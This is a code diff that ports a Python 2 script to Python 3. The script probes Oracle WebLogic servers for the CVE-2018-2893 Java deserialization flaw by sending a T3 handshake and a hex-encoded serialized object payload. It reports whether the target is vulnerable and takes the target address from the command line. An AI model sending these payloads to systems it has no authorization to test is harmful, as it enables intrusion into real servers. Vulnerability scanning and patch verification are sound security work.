@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # _*_ coding:utf-8 _*_
 '''
  ____       _     _     _ _   __  __           _    
@@ -12,6 +12,11 @@ import socket
 import time
 import re
 import sys
+import logging
+
+logging.basicConfig(filename='Weblogic.log',
+                    format='%(asctime)s %(message)s',
+                    filemode="w", level=logging.INFO)
 
 VUL=['CVE-2018-2893']
 
@@ -21,9 +26,9 @@ VER_SIG=['StreamMessageImpl']
 
 def t3handshake(sock,server_addr):
     sock.connect(server_addr)
-    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
+    sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
     time.sleep(1)
-    data = sock.recv(1024)
+    sock.recv(1024)
 
 
 def buildT3RequestObject(sock,port):
@@ -32,7 +37,7 @@ def buildT3RequestObject(sock,port):
     data3 = '1a7727000d3234322e323134'
     data4 = '2e312e32353461863d1d0000000078'
     for d in [data1,data2,data3,data4]:
-        sock.send(d.decode('hex'))
+        sock.send(bytes.fromhex(d))
     time.sleep(2)
 
 
@@ -41,45 +46,38 @@ def sendEvilObjData(sock,data):
     payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
     payload+=data
     payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
-    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
-    sock.send(payload.decode('hex'))
+    payload = '%s%s'%('{:08x}'.format(len(payload)//2 + 4),payload)
+    sock.send(bytes.fromhex(payload))
     time.sleep(2)
-    sock.send(payload.decode('hex'))
+    sock.send(bytes.fromhex(payload))
     res = ''
     try:
         while True:
             res += sock.recv(4096)
             time.sleep(0.1)
-    except Exception as e:
+    except Exception:
         pass
     return res
 
-def checkVul(res,server_addr,index):
+def checkVul(res,index):
     p=re.findall(VER_SIG[index], res, re.S)
     if len(p)>0:
-        # print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index])
-        print (u'[+]目标weblogic存在JAVA反序列化漏洞：{}'.format(VUL[index]))
+        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
+        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
     else:
-        # print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index])
-        # pass
-        # print (u'目标weblogic未检测到：{}'.format(VUL[index]))
-        print (u'[-]目标weblogic未检测到{}'.format(VUL[index]))
+        logging.info('[-]Target weblogic not detected {}'.format(VUL[index]))
+        print('[-]Target weblogic not detected {}'.format(VUL[index]))
 
 def run(dip,dport,index):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
     sock.settimeout(10)
     server_addr = (dip, dport)
     t3handshake(sock,server_addr)
     buildT3RequestObject(sock,dport)
     rs=sendEvilObjData(sock,PAYLOAD[index])
-    #print 'rs',rs
-    checkVul(rs,server_addr,index)
+    checkVul(rs,index)
 
 if __name__=="__main__":
-    # dip = sys.argv[1]
-    # dport = int(sys.argv[2])
-    # run(dip,dport,0)
-    rip = '127.0.0.1'
-    rport = 7001
-    run(rip,rport,0)
+    dip = sys.argv[1]
+    dport = int(sys.argv[2])
+    run(dip,dport,0)
